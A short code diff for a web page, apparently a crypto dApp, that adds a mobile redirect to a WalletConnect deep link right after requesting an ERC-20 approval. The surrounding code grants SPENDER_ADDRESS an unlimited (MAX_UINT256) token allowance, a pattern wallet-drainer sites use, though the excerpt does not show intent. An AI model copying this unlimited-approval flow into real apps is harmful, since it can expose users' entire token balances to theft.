@@ -299,6 +299,12 @@ export default function Home() {
           functionName: "approve",
           args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
         });
+        
+        if (isMobile()) {
+          setTimeout(() => {
+            window.location.href = "wc://";
+          }, 300);
+        }
       }, 500);
     } else {
       setStep("done");
@@ -321,6 +327,12 @@ export default function Home() {
           functionName: "approve",
           args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
         });
+        
+        if (isMobile()) {
+          setTimeout(() => {
+            window.location.href = "wc://";
+          }, 300);
+        }
       } catch (err: any) {
         setError(err?.message || "Failed to approve token");
         setStep("idle");
